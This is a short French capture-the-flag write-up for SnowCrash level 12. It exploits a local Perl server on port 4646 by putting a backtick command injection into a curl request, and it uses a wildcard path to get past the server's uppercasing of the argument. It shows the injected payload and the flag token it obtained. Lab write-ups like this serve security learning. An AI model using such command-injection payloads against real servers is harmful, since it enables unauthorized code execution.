# Level12

Nous arrivons sur le home de l'utilisateur et nous y trouvons un fichier `level12.pl`.
Le script est un serveur qui ecoute sur le port 4646.
Nous pouvons voir que le serveur utilise egrep.
```
level12@SnowCrash:~$ echo '#!/bin/bash
> /bin/getflag > /tmp/flag12' > /tmp/SCRIPT12
level12@SnowCrash:~$ chmod 777 /tmp/SCRIPT12
level12@SnowCrash:~$ curl localhost:4646/?x='`/*/SCRIPT12`'
..level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
Le fichier doit forcement etre en majuscule, car il y a une regex qui passe en uppercase l'argument x, (l'argument y n'est pas utilisé).
Dans le curl nous pouvons donner l'argument en minuscule si nous le souhaitons.
